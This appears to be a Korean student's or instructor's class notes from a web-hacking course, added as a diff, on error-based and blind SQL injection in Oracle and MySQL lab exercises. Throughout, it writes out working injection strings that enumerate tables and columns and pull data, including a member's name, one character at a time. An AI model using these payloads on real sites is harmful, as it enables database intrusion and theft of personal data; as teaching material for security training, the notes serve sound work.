@@ -1,0 +1,504 @@
+* 3일차 메모
+
+- Union SQL Injection
+
+1. 쿼리문 유추
+
+select 컬럼들 from 게시판 
+where 제목 like '%__검색어__%'
+
+2. 공격 포인트 
+
+검색어 : CC%' and 1=extractvalue('1', concat(0x3a, (____공격쿼리____))) and 'k%'='k
+
+3. 에러 테스트 
+검색어 : CC%' and 1=extractvalue('1', concat(0x3a, (____공격쿼리____))) and 'k%'='k
+검색어 : CC%' and 1=extractvalue('1', concat(0x3a, (select 'hacker'))) and 'k%'='k
+
+4. 테이블 : eqst_answer
+  select table_name from information_schema.tables 
+ 4-1. 개수 : 7개
+select count(table_name) from information_schema.tables where table_schema = database()
+
+검색어 : CC%' and 1=extractvalue('1', concat(0x3a, (____공격쿼리____))) and 'k%'='k
+
+검색어 : CC%' and 1=extractvalue('1', concat(0x3a, (select count(table_name) from information_schema.tables where table_schema = database()))) and 'k%'='k
+
+
+ 4-2. 1 row 
+
+  select table_name from information_schema.tables where table_schema = database() limit 0, 1
+
+
+검색어 : CC%' and 1=extractvalue('1', concat(0x3a, (____공격쿼리____))) and 'k%'='k
+
+검색어 : CC%' and 1=extractvalue('1', concat(0x3a, (select table_name from information_schema.tables where table_schema = database() limit 0, 1))) and 'k%'='k
+
+5. 컬럼 : answer_column
+select column_name from information_schema.columns where table_name = 'eqst_answer'
+
+ 5-1. 개수 : 1개
+
+select count(column_name) from information_schema.columns where table_name = 'eqst_answer'
+
+CC%' and 1=extractvalue('1', concat(0x3a, (____공격쿼리____))) and 'k%'='k
+CC%' and 1=extractvalue('1', concat(0x3a, (select count(column_name) from information_schema.columns where table_name = 'eqst_answer'))) and 'k%'='k
+
+ 5-2. 1row 
+select column_name from information_schema.columns where table_name = 'eqst_answer'
+
+CC%' and 1=extractvalue('1', concat(0x3a, (____공격쿼리____))) and 'k%'='k
+CC%' and 1=extractvalue('1', concat(0x3a, (select column_name from information_schema.columns where table_name = 'eqst_answer'))) and 'k%'='k
+
+
+6. 데이터 
+
+select answer_column from eqst_answer 
+
+6-1. 개수 : 1개
+select count(answer_column) from eqst_answer 
+
+CC%' and 1=extractvalue('1', concat(0x3a, (____공격쿼리____))) and 'k%'='k
+CC%' and 1=extractvalue('1', concat(0x3a, (select count(answer_column) from eqst_answer ))) and 'k%'='k
+
+6-2. 데이터 추출 
+
+CC%' and 1=extractvalue('1', concat(0x3a, (select answer_column from eqst_answer ))) and 'k%'='k
+
+
+* Union은 엑셀 시트 통으로 한꺼번에 
+ -> 여러개의 Column, 여러개의 Row 
+* Error-based 하나의 문자열 
+ -> 한개의 Column, 한개의 Row 
+    몇개?
+* Blind SQL Injection 
+ -> 한개의 Column, 한개의 Row, 한개의 글자씩 
+    몇개? 몇글자인지?
+
+select * from 게시판 
+where 제목 like '%CC%' and '1%'='2
+
+1. 쿼리문 유추 
+
+2. 공격포인트 
+
+3. 테이블 
+ 3-1. 테이블 개수 
+ 3-2. 테이블 1 row 씩 
+   3-2-1. 1 row의 글자수
+   3-2-2. 1 row의 글자를 1글자씩 아스키
+
+4. 컬럼 
+
+5. 데이터 
+
+select * from friends where name like '%야옹십%' and 
+
+(select count(table_name) from user_tables) = 3
+and 'r%'='r%';
+
+-- 테이블 개수
+-- (select count(table_name) from user_tables) = 2
+
+-- 테이블 1 row 
+-- (select table_name from (select table_name, rownum as uu from user_tables) where uu = 1)
+
+
+select * from friends where name like '%야옹십%' and 
+
+(select table_name from (select table_name, rownum as uu from user_tables) where uu = 1) > 'Ff'
+
+and 'r%'='r%';
+
+
+select ascii('MEMBERS') from dual;
+
+
+* 유저명 뽑기 
+
+친구 검색 기능 
+
+1. 쿼리문 유추 
+
+select * from friends where name like '%__검색어__%'
+
+2. 공격 포인트 
+
+야옹십%' and 'f'='f' and 't%'='t 
+야옹십%' and 'f'='g' and 't%'='t 
+
+검색어 : 야옹십%' and (__공격쿼리__) and 't%'='t 
+
+* 오라클  
+length() substr() ascii()
+
+
+3. 유저명 
+ 3-1. 유저명의 글자수 length() : 4글자 
+   select user from dual
+   (select length(user) from dual) > 0
+
+검색어 : 야옹십%' and ((select length(user) from dual) > 0) and 't%'='t 
+
+ 3-2. 한글자씩 : substr((서브쿼리),몇번째글자,몇개) -> ascii 
+
+  (select ascii(substr(user,1,1)) from dual) > 0 
+  
+검색어 : 야옹십%' and (__공격쿼리__) and 't%'='t 
+
+검색어 : 야옹십%' and ( (select ascii(substr(user,1,1)) from dual) > 0 ) and 't%'='t 
+ 
+ 1: 84
+ 2: 69
+ 3: 83
+ 4: 84
+
+TEST
+
+
+1. 쿼리문 유추 
+
+select 컬럼들 from 게시판 where 
+제목 like '%__검색어__%'
+
+2. 공격포인트
+
+검색어 : eagle%' and 10=10 and 'w%'='w
+                    ~~~~~~~
+                      참
+검색어 : eagle%' and 10=9 and 'w%'='w 
+                    ~~~~~~~
+                      거짓 
+
+검색어 : eagle%' and (__공격쿼리__) and 'w%'='w                       
+
+3. 유저명 
+ select user from dual 
+
+ 3-1. 유저명 글자수 : 4글자
+ (select length(user) from dual) > 0
+ 
+검색어 : eagle%' and (__공격쿼리__) and 'w%'='w   
+검색어 : eagle%' and (((select length(user) from dual) > 0)) and 'w%'='w   
+
+ 3-2. 유저명 1글자씩 아스키 
+  (select ascii(substr(user, 1 ,1)) from dual) > 0
+
+검색어 : eagle%' and (__공격쿼리__) and 'w%'='w   
+검색어 : eagle%' and (select ascii(substr(user, 1 ,1)) from dual) > 0 and 'w%'='w   
+
+1 : 73
+2 : 78
+3 : 70
+4 : 54
+
+==============================
+* SQL Injection 문제 4번 MySQL 
+==============================
+1. 풀이 과정
+2. 정답
+==============================
+
+오라클  vs MySQL 
+user      user() 
+substr()  substring()? substr()?
+length()   length() ?     len()
+TEST         TEST@127.0.0.1
+
+user -> @ 앞까지만 해줘
+->
+===============================
+* SQL Injection 문제 5번 Oracle -> 30분에 풀이
+===============================
+1. 풀이과정
+2. 정답
+===============================
+
+========================================
+* 쇼핑몰 1번 -> 5시 15분 풀이
+========================================
+1. 풀이과정
+2. 정답
+
+- Hint 1 : 검색창에 하는거 아닙니다!!
+           매너리즘 타파
+- Hint 2 : 쿼리문을 유추!!!!!
+- Hint 3 : 자료형!!! like 아님
+========================================
+
+==========================================
+* 쇼핑몰 1번 - 한글 탈취
+==========================================
+개인정보 테이블에서 1번째 사람 이름 털기!
+select NAME from MEMBER where rownum = 1
+==========================================
+
+
+
+
+
+* Blind SQL Injection 공격 쿼리
+
+1. 쿼리문 유추
+
+ like '%__검색어__%'
+
+2. 공격 포인트 
+
+ 참%' and (공격쿼리) and 'q%'='q 
+
+3. 테이블 명 
+ 
+  - Oracle 
+  select table_name from user_tables 
+  select table_name from all_tab_columns where owner = user 
+ 
+  - MySQL 
+  select table_name from information_schema.tables where table_schema = database()
+
+ 3-1. 테이블의 개수
+
+   (select count(table_name) from user_tables) > 0
+
+   (select count(table_name) from information_schema.tables where table_schema = database()) > 0
+
+    참%' and (select count(table_name) from user_tables) > 0 and 'q%'='q 
+    참%' and (select count(table_name) from information_schema.tables where table_schema = database()) > 0 and 'q%'='q 
+
+  3-2. 테이블 1 row 씩 
+    select table_name from (select table_name, rownum as ln from user_tables)
+    where ln = 1 ~ count 
+
+    select table_name from information_schema.tables where table_schema = database() limit 0 ~ (count-1), 1
+
+    3-2-1. 글자 수
+
+    (select length(table_name) from (select table_name, rownum as ln from user_tables)
+    where ln = 1 ~ count) > 0
+
+    (select length(table_name) from information_schema.tables where table_schema = database() limit 0 ~ (count-1), 1) > 0
+
+    3-2-2. 한글자씩 아스키 
+    (select ascii(substr(table_name,1~length,1)) from (select table_name, rownum as ln from user_tables where ln = 1 ~ count) > 0
+
+4. 컬럼명 
+
+   select column_name from all_tab_columns where table_name = '테이블명'
+   select column_name from user_tab_columns where table_name = '테이블명'
+   select column_name from cols where table_name = '테이블명'
+
+   select column_name from information_schema.columns where table_name = '테이블명'
+
+   4-1. '테이블'의 컬럼의 개수
+   (select count(column_name) from cols where table_name = '테이블명') > 0
+
+   (select count(column_name) from information_schema.columns where table_name = '테이블명') > 0
+
+   4-2. 컬럼 1 row 
+    select column_name from (select column_name, rownum as ln from cols where table_name = '테이블명') where ln = 1~ count 
+
+    select column_name from information_schema.columns where table_name = '테이블명' limit 0~(count-1), 1
+
+     4-2-1. 글자수 
+     (select length(column_name) from (select column_name, rownum as ln from cols where table_name = '테이블명') where ln = 1~ count) > 0
+
+     (select length(column_name) from information_schema.columns where table_name = '테이블명' limit 0~(count-1), 1) > 0
+
+     4-2-2. 한글자씩 아스키 
+
+    (select ascii(substr(column_name,1~length,1)) from (select column_name, rownum as ln from cols where table_name = '테이블명') where ln = 1~ count) > 0
+
+    (select ascii(substring(column_name,1~length,1)) from information_schema.columns where table_name = '테이블명' limit 0~(count-1), 1) > 0
+
+5. 데이터 탈취 
+select 컬럼명탈취 from 테이블탈취 
+
+  5-1. 데이터 개수 
+    
+    (select count(컬럼명탈취) from 테이블탈취) > 0
+
+  5-2. 1 row씩 
+    
+  select 컬럼명 from (select 컬럼명탈취, rownum as ln from 테이블탈취) where ln = 1 ~ count 
+
+  select 컬럼명 from 테이블명 limit 0~count-1,1
+
+     5-2-1. 글자수
+     (select length(컬럼명) from (select 컬럼명탈취, rownum as ln from 테이블탈취) where ln = 1 ~ count) > 0
+
+     (select length(컬럼명) from 테이블명 limit 0~count-1,1) > 0
+
+     5-2-2. 한글자씩 아스키 
+     (select ascii(substr(컬럼명,1~length,1)) from (select 컬럼명탈취, rownum as ln from 테이블탈취) where ln = 1 ~ count) > 0
+
+     (select ascii(sbstring(컬럼명,1~length,1)) from 테이블명 limit 0~count-1,1) > 0
+
+
+1. 쿼리문 유추 
+  select 컬럼들 from 게시판 
+  where 제목 like '%__검색어__%'
+
+2. 공격 포인트
+test%' and 5=5    and 'q%'='q (참)
+test%' and 5=6    and 'q%'='q (거짓)
+
+검색어 : test%' and (__공격쿼리__)  and 'q%'='q
+
+3. 테이블명 : ANSWER 
+
+4. 컬럼명  : ANSWER 
+ select column_name from cols where table_name = 'ANSWER'
+
+ 4-1. ANSWER테이블의 컬럼의 개수 : 5개
+ (select count(column_name) from cols where table_name = 'ANSWER') > 0
+
+ 검색어 : test%' and (__공격쿼리__)  and 'q%'='q 
+
+ 검색어 : test%' and ((select count(column_name) from cols where table_name = 'ANSWER') > 0)  and 'q%'='q
+ 
+ 4-2. 1 row씩 
+ (select column_name from (select column_name, rownum as linenumber from cols where table_name = 'ANSWER') where linenumber = 1) = 'ANSWER'
+
+검색어 : test%' and (__공격쿼리__)  and 'q%'='q 
+검색어 : test%' and ((select column_name from (select column_name, rownum as linenumber from cols where table_name = 'ANSWER') where linenumber = 1) = 'ANSWER')  and 'q%'='q 
+
+
+   4-2-1. 글자수 
+
+   (select length(column_name) from (select column_name, rownum as linenumber from cols where table_name = 'ANSWER') where linenumber = 1) > 0
+
+   검색어 : test%' and (__공격쿼리__)  and 'q%'='q 
+   검색어 : test%' and ((select length(column_name) from (select column_name, rownum as linenumber from cols where table_name = 'ANSWER') where linenumber = 1) > 0)  and 'q%'='q 
+
+   ANSWER테이블의 
+   1번째 컬럼의 글자수 : 6글자
+   2번째                 : 
+   4-2-2. 한글자씩 아스키
+
+(select ascii(substr(column_name,1,1)) from (select column_name, rownum as linenumber from cols where table_name = 'ANSWER') where linenumber = 1) > 0
+
+검색어 : test%' and (__공격쿼리__)  and 'q%'='q 
+검색어 : test%' and ((select ascii(substr(column_name,1,1)) from (select column_name, rownum as linenumber from cols where table_name = 'ANSWER') where linenumber =1 ) > 0)  and 'q%'='q 
+
+  1번째 컬럼의 1번째 글자 아스키 : 65
+               2번째 글자 아스키 : 78
+               3                 : 83
+               4                 : 87
+               5                 : 69
+               6번째             : 82
+  2번째 ㅂ1
+
+5. 데이터 
+ select answer from answer 
+ 5-1. 데이터 개수 : 1개 
+   (select count(answer) from answer) > 0
+
+   검색어 : test%' and (__공격쿼리__)  and 'q%'='q 
+   검색어 : test%' and ((select count(answer) from answer) =1)  and 'q%'='q 
+ 5-2. 1row (X)
+    select answer from answer 
+    5-2-1. 글자수 : 4글자
+    (select length(answer) from answer) > 0
+
+    검색어 : test%' and ((select length(answer) from answer) > 0) and 'q%'='q 
+
+    5-2-2. 한글자씩 아스키
+
+    (select ascii(substr(answer,1,1)) from answer) > 0
+
+    검색어 : test%' and (__공격쿼리__)  and 'q%'='q 
+    검색어 : test%' and ((select ascii(substr(answer,1,1)) from answer) > 0)  and 'q%'='q 
+
+    1: 97
+    2: 110
+    3: 116
+    4: 54
+  
+
+
+
+
+=========================
+      명예의 전당
+=========================
+    [    최원진    ]
+    [    이준하    ]
+    [    지수민    ]
+    [    신현서    ]
+    [    전우창    ]
+    [    황여진    ]    
+    [    이미소    ]
+    [    김회엽    ]    
+    [    엄유진    ]
+    [    허윤아    ]
+
+
+1차 검색기능 (꽝)
+
+1. 쿼리문 유추
+  select 컬럼들 from 상품정보 where 상품명 like '%__검색어__%'
+
+2. 공격 포인트 
+
+select 컬럼들 from 상품정보 where 상품명 like '%갤럭%' and 6=6    and  't%'='t%'
+
+검색어 : 갤럭%' and 6=6 and 't%'='t (참)
+검색어 : 갤럭%' and 6=7 and 't%'='t (거짓)
+
+
+
+2차 상품번호 
+1. 쿼리문 유추 
+select 컬럼 from 상품상세 where 상품번호 = 62 and 4=4
+
+'62.0' '62'
+62 = 62.0
+
+=============================
+id       name      detail
+================================
+61     맥북        비싼 노트북
+62     아이폰      얘도 비싸
+162    갤럭시북     비싸
+625    갤럭시S37   언젠가나옴
+
+2. 공격 포인트 
+
+select 컬럼 from 상품상세 where 상품번호 ='62' and 3=3 and 'o'='o'
+
+참   62' and 3=3 and 'o'='o
+거짓 62' and 3=4 and 'o'='o
+
+참   62 and 4=4
+거짓 62 and 4=3
+
+id : 62 and (공격쿼리)
+
+3. 유저명 
+  3-1. 유저명의 글자수 : 8개
+    62 and length(user) > 0
+
+  3-2. 한글자씩 아스키
+    62 and ascii(substr(user,1,1)) > 0
+   1: 85
+   2: 83
+   3: 69
+   4:  
+
+  62 and user='USEWORLD'
+
+* 한글
+
+
+글자수 : 3글자
+62 and (select length(name) from member where rownum =1) > 0
+
+
+62 and (select ascii(substr(name,1,1)) from member where rownum = 1) > 0
+
+1:15382912
+2:15500472
+3:15506089
+
+
+%ea%b9%80%ec%84%b8%ec%9a%a9
